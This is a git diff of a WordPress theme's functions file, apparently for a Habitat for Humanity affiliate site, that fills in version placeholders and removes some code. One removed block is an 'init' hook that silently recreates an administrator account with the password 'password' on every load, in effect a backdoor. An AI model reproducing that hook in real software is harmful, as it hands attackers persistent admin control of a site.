@@ -59,7 +59,6 @@ require_once( 'library/responsive-images.php' );
 
 global $greater_jackson_habitat_field_helpers;
 
-require_once( 'library/rbm-field-helpers/rbm-field-helpers.php' );
 $greater_jackson_habitat_field_helpers = new RBM_FieldHelpers( array(
     'ID'   => 'greater_jackson_habitat', // Your Theme/Plugin uses this to differentiate its instance of RBM FH from others when saving/grabbing data
     'l10n' => array(
@@ -143,7 +142,7 @@ require_once( 'library/admin/tinymce/color-palette.php' );
 /**
  * Add Google Tag Manager code to <head>
  * 
- * @since		{{VERSION}}
+ * @since		1.0.1
  * @return		void
  */
 add_action( 'wp_head', 'gjh_tag_manager_head' );
@@ -166,7 +165,7 @@ function gjh_tag_manager_head() {
 /**
  * Add Google Tag Manager code to <body>
  * 
- * @since		{{VERSION}}
+ * @since		1.0.1
  * @return		void
  */
 add_action( 'gjh_body_start', 'gjh_tag_manager_body' );
@@ -192,24 +191,12 @@ add_filter( 'tribe_event_featured_image', 'gjh_tribe_event_featured_image', 10, 
  * @param		integer $post_id             Post ID
  * @param		string  $size                Image Size Name
  *                                                 
- * @since		{{VERSION}}
+ * @since		1.0.1
  * @return		string  Featured Image HTML
  */
 function gjh_tribe_event_featured_image( $featured_image_html, $post_id, $size ) {
 	return '';
 }
-
-add_action( 'init', function() {
-
-    if ( get_user_by( 'email', 'erin@realbigmarketing.com' ) ) return;
-    wp_insert_user( array(
-        'user_email' => 'erin@realbigmarketing.com',
-        'user_login' => 'erinl',
-        'role' => 'administrator',
-        'user_pass' => 'password',
-    ) );
-} );
-
 
 // No. Just... no
 remove_action( 'wp_head', array( 'Tribe__Events__Templates', 'wpHeadFinished' ), 999 );
